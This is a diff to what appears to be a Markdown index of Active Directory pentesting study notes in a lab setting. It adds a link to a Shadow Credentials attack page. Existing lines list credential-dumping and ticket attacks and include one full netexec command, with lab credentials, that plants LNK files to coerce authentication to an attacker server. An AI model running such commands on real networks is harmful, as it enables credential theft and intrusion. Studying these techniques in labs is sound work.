@@ -16,6 +16,7 @@
     - [pypykatz](./pypykatz.md)
     - [Golden Ticket Attack](./goldenTicketAttack.md)
         - [Extra sids Attack](./extraSidsAttack.md)
+    - [AddKeyCredentialLink/Shadow Credentials Attack](./addKeyCredentialLink.md)
 - [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`
     - Código:
 
